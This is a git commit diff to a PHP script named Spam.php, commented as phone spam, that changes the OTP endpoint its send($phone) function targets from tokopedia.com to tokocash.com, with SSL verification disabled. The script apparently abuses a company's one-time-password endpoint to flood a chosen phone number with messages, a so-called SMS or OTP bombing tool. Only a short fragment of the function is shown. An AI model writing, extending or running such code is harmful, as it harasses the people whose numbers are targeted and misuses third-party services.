99d371f00ec868c6f574929faa30ca6daeb06a4e
WeAreHer3 <50907153+WeAreHer3@users.noreply.github.com>
2019-05-23 13:22:16 +0700

    Update Spam.php

--- Spam.php
+++ Spam.php
@@ -2,7 +2,7 @@
 //Spam Telepon
 function send($phone) {
         $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, "https://www.tokopedia.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_HEADER, true);
